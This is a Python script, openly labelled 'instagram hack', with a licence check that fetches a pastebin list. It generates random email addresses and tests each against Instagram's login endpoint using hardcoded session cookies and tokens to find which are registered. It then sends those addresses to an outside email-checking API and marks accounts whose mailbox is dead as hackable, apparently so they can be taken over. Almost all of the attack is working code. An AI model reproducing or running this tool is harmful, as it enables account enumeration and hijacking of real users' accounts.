#.
import requests
import time
import os
import random
import sys
def danyar():
  import requests
  import random
  import os
  import sys
  import time


  os.system("xeg-open https://www.instagram.com/i.punjabii/")
  os.system("clear")
  def cheker_insta():
      os.system("clear")
      four=open("emil.txt","w")
      listt=open("instagramm.txt",'r').readlines()
      for x in listt:
          u=x.strip()
          head={
              'authority': 'www.instagram.com',
              'method': 'POST',
              'path': '/accounts/login/ajax/',
              'scheme': 'https',
              'accept': '*/*',
              'accept-encoding': 'gzip, deflate, br',
              'accept-language': 'en-US,en;q=0.9,ar;q=0.8,en-GB;q=0.7',
              'content-length': '277',
              'content-type': 'application/x-www-form-urlencoded',
              'cookie': 'ig_did=D9AD55FF-D40F-4569-8F3D-72923D6B496D; mid=X-oMXwAEAAFsGP-VB_KrvTNjqpMV; ig_nrcb=1; datr=lbztX-QwAT9uM6uzLDWzbgof; fbm_124024574287414=base_domain=.instagram.com; ds_user_id=45246725385; csrftoken=u27l2skXxXS3smNyYh7bYQ7GZeC39zq5',
              'origin': 'https://www.instagram.com',
              'referer': 'https://www.instagram.com/accounts/login/',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'same-origin',
              'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36',
              'x-csrftoken': 'u27l2skXxXS3smNyYh7bYQ7GZeC39zq5',
              'x-ig-app-id': '936619743392459',
              'x-ig-www-claim': '0',
              'x-instagram-ajax': '7a3a3e64fa87',
              'x-requested-with': 'XMLHttpRequest'
              }


          datt={
              'username': u,
              'enc_password': '#PWD_INSTAGRAM_BROWSER:10:1612018949:AQhQABddFDWlpkKVhPAXc565cx4otk7lGm04m4S2+v2M5zRqFYhBcsGJbiVVgXIkHuLLmQMWo3tU25a6/zcsYh5hBLHICqK/WFg7XzoGv1IvYo31Ftdn+IcCHil/5a36Rv/D6ISdfme8B+2r',
              'queryParams': '{}',
              'optIntoOneTap': 'false'
              }
          url='https://www.instagram.com/accounts/login/ajax/'
     
          re =requests.post(url,headers=head,data=datt).text
          if '"user":true' in re:
              print("")
              print(u+ " >= \033[1;32mHacked 🙃\033[1;37m ")
              four.write(u+"\n")

          else:
              print("")
              print(u+ ' >= \033[1;31mHack Nabet 😡\033[1;37m')

  def emil():
      logo="""\033[1;31m
    
      instagram hack 
    
      \033[1;37m
    
      """
      print(logo)
      print("----_----")
      print("")
      print("\033[1;36mSnapchat > @i.punjabi\033[1;37m")
      print("")
      print("----_----")
      print("")
      print("\033[1;36minstagram > @i.punjabii\033[1;37m")
      print("")
      print("----_----")
      print("")
      print("")
      print("----_----")
      print("")
      print("")
      print("~~~~~~~~~~~~~~~~~~~~")
      print("")
      op=open("instagramm.txt",'w')
      name=input("TKAYA NAWEK BNUSA :")
      print(" < 1 > gmail.com ")
      print(" < 2 > yahoo.com")
      print(" < 3 > hotmail.com")
      kamyan=int(input("KAMYAN : "))
      if kamyan==1:
          noo="gmail.com"
      elif kamyan==2:
          noo="yahoo.com"
      elif kamyan==3:
          noo="hotmail.com"


      for x in range(300):
          x='04846574811230498675010129387657'
          x1=random.choice(x)
          x2=random.choice(x)
          x3=random.choice(x)
          ani=name+x1+x2+x3+'@'+noo
          print(ani)
          op.write(ani+"\n")
      time.sleep(3)
      print("")
      print("--------------")
      print("ALL EMIL SAVE IN FILE INSTAGRAM.TXT")
      time.sleep(3)








  def cheker_emil():
      hack=open("hacked.txt","w")
      os.system("clear")
      op=open("emil.txt",'r').readlines()
      for x in op:
          time.sleep(13)
          u=x.strip()
          re = 'https://mmo69.com/_check_live_email/api.php?email='+u
        
          req=requests.get(re).text
          print(req)
        
          if "DIE" in req:
                print(u +" >= \033[1;32mHack abe \033[1;37m")
                print("")
                hack.write(u+"\n")
          else:
                print(u+" >= \033[1;31mHack nabe\033[1;37m ")
  

  emil()
  cheker_insta()
  cheker_emil()
  exit()
  
def baha():
    uuid = str(os.geteuid()) + str(os.getlogin())
    id = "-".join(uuid)
    print("\x1b[37;1mYour ID : "+id)
    try:
        httpCaht = requests.get("https://pastebin.com/2WuEPjdc").text
        if id in httpCaht:
            print("\x1b[37;1mYOUR ID IS ACTIVE.........")
            msg = str(os.geteuid())
            time.sleep(1)
            danyar()
            
        else:
            print("\x1b[37;1mYOUR ID IS NOT ACTIVE.........")
            time.sleep(1)
            sys.exit()
    except:
        sys.exit()

    if name == '__main__':
        baha()

os.system('xdg-open https://www.instagram.com/i.punjabii/')
os.system('clear')





baha()           
danyar()
